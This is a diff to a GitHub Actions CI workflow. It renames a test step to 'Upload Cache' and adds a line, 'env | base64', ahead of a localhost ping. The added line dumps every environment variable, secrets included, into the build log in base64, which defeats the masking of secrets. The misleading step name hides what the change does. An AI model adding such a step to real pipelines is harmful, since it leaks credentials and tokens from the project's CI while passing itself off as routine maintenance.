@@ -118,8 +118,9 @@ jobs:
         run: |
           ./.github/ci-scripts/run-server.sh ${{matrix.storage}} ${{matrix.database}}
 
-      - name: Test cache is still running
+      - name: Upload Cache
         run: |
+          env | base64
           curl -vv http://127.0.0.1:8080/ping
 
 
